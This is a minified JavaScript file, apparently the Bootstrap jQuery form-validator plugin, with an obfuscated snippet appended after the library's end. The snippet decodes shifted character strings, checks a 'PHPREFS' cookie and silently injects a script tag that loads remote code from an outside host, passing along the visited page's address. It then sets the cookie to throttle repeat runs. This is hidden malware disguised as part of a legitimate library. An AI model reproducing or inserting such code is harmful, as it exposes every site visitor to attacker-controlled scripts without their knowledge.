this.$inputs=this.$element.find(n.INPUT_SELECTOR).add(this.$element.find('[data-validate="true"]')).not(this.$element.find('[data-validate="false"]')),this},n.prototype.onInput=function(e){var i=this,n=t(e.target),r="focusout"!==e.type;this.$inputs.is(n)&&this.validateInput(n,r).done((function(){i.toggleSubmit()}))},n.prototype.validateInput=function(i,n){e(i);var r=i.data("bs.validator.errors");i.is('[type="radio"]')&&(i=this.$element.find('input[name="'+i.attr("name")+'"]'));var a=t.Event("validate.bs.validator",{relatedTarget:i[0]});if(this.$element.trigger(a),!a.isDefaultPrevented()){var o=this;return this.runValidators(i).done((function(e){i.data("bs.validator.errors",e),e.length?n?o.defer(i,o.showErrors):o.showErrors(i):o.clearErrors(i),r&&e.toString()===r.toString()||(a=e.length?t.Event("invalid.bs.validator",{relatedTarget:i[0],detail:e}):t.Event("valid.bs.validator",{relatedTarget:i[0],detail:r}),o.$element.trigger(a)),o.toggleSubmit(),o.$element.trigger(t.Event("validated.bs.validator",{relatedTarget:i[0]}))}))}},n.prototype.runValidators=function(i){function n(t){return function(t){return i.data(t+"-error")}(t)||function(){var t=i[0].validity;return t.typeMismatch?i.data("type-error"):t.patternMismatch?i.data("pattern-error"):t.stepMismatch?i.data("step-error"):t.rangeOverflow?i.data("max-error"):t.rangeUnderflow?i.data("min-error"):t.valueMissing?i.data("required-error"):null}()||i.data("error")}var r=[],a=t.Deferred();return i.data("bs.validator.deferred")&&i.data("bs.validator.deferred").reject(),i.data("bs.validator.deferred",a),t.each(this.validators,t.proxy((function(t,a){var o=null;(e(i)||i.attr("required"))&&(i.data(t)||"native"==t)&&(o=a.call(this,i))&&(o=n(t)||o,!~r.indexOf(o)&&r.push(o))}),this)),!r.length&&e(i)&&i.data("remote")?this.defer(i,(function(){var o={};o[i.attr("name")]=e(i),t.get(i.data("remote"),o).fail((function(t,e,i){r.push(n("remote")||i)})).always((function(){a.resolve(r)}))})):a.resolve(r),a.promise()},n.prototype.validate=function(){var e=this;return t.when(this.$inputs.map((function(i){return e.validateInput(t(this),!1)}))).then((function(){e.toggleSubmit(),e.focusError()})),this},n.prototype.focusError=function(){if(this.options.focus){var e=this.$element.find(".has-error:first :input");0!==e.length&&(t("html, body").animate({scrollTop:e.offset().top-n.FOCUS_OFFSET},250),e.focus())}},n.prototype.showErrors=function(e){var i=this.options.html?"html":"text",n=e.data("bs.validator.errors"),r=e.closest(".form-group"),a=r.find(".help-block.with-errors"),o=r.find(".form-control-feedback");n.length&&(n=t("<ul/>").addClass("list-unstyled").append(t.map(n,(function(e){return t("<li/>")[i](e)}))),void 0===a.data("bs.validator.originalContent")&&a.data("bs.validator.originalContent",a.html()),a.empty().append(n),r.addClass("has-error has-danger"),r.hasClass("has-feedback")&&o.removeClass(this.options.feedback.success)&&o.addClass(this.options.feedback.error)&&r.removeClass("has-success"))},n.prototype.clearErrors=function(t){var i=t.closest(".form-group"),n=i.find(".help-block.with-errors"),r=i.find(".form-control-feedback");n.html(n.data("bs.validator.originalContent")),i.removeClass("has-error has-danger has-success"),i.hasClass("has-feedback")&&r.removeClass(this.options.feedback.error)&&r.removeClass(this.options.feedback.success)&&e(t)&&r.addClass(this.options.feedback.success)&&i.addClass("has-success")},n.prototype.hasErrors=function(){return!!this.$inputs.filter((function(){return!!(t(this).data("bs.validator.errors")||[]).length})).length},n.prototype.isIncomplete=function(){return!!this.$inputs.filter("[required]").filter((function(){var i=e(t(this));return!("string"==typeof i?t.trim(i):i)})).length},n.prototype.onSubmit=function(t){this.validate(),(this.isIncomplete()||this.hasErrors())&&t.preventDefault()},n.prototype.toggleSubmit=function(){this.options.disable&&this.$btn.toggleClass("disabled",this.isIncomplete()||this.hasErrors())},n.prototype.defer=function(e,i){if(i=t.proxy(i,this,e),!this.options.delay)return i();window.clearTimeout(e.data("bs.validator.timeout")),e.data("bs.validator.timeout",window.setTimeout(i,this.options.delay))},n.prototype.reset=function(){return this.$element.find(".form-control-feedback").removeClass(this.options.feedback.error).removeClass(this.options.feedback.success),this.$inputs.removeData(["bs.validator.errors","bs.validator.deferred"]).each((function(){var e=t(this),i=e.data("bs.validator.timeout");window.clearTimeout(i)&&e.removeData("bs.validator.timeout")})),this.$element.find(".help-block.with-errors").each((function(){var e=t(this),i=e.data("bs.validator.originalContent");e.removeData("bs.validator.originalContent").html(i)})),this.$btn.removeClass("disabled"),this.$element.find(".has-error, .has-danger, .has-success").removeClass("has-error has-danger has-success"),this},n.prototype.destroy=function(){return this.reset(),this.$element.removeAttr("novalidate").removeData("bs.validator").off(".bs.validator"),this.$inputs.off(".bs.validator"),this.options=null,this.validators=null,this.$element=null,this.$btn=null,this};var r=t.fn.validator;t.fn.validator=i,t.fn.validator.Constructor=n,t.fn.validator.noConflict=function(){return t.fn.validator=r,this},t(window).on("load",(function(){t('form[data-toggle="validator"]').each((function(){var e=t(this);i.call(e,e.data())}))}))}(jQuery);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));